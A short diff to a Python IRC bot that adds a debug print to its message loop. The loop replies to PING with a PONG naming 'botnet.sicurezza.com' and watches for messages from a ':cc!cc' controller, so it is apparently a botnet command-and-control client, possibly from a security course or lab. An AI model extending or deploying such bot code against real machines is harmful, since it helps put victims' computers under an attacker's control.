@@ -13,6 +13,7 @@ def readMessage(s):
     buff = s.recv(2048).decode("UTF-8")
     message = buff.split("\r\n")
     for m in message:
+        print(m)
         if m.startswith("PING"):
             sendMessage(s, "PONG :botnet.sicurezza.com")
         if m.startswith(":cc!cc"):
